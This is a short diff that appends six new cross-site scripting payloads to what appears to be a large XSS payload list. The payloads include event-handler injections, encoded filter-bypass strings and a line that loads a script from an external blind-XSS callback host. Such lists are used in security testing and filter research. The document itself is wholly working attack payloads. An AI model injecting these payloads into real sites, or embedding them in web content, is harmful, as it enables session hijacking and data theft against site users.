@@ -4138,3 +4138,9 @@ javascript:alert'1
 "/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
 %3Cbutton%20onclick%3D%60alert%28%2FXSS%2F%29%60%3EClick%20ME%3C%2Fbutton%3E
 ddd");<​/script><​script>alert("XSS");<​/script><​script>aaa("
+<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x> <div style=scroll-snap-align:center>1337</div> </section>
+ '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+<Svg/OnLoad=alert%25%0A26lpar;1)>
+\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>
+</scrpt><scrpt/src=//xss.report/c/target-1></scrpt>
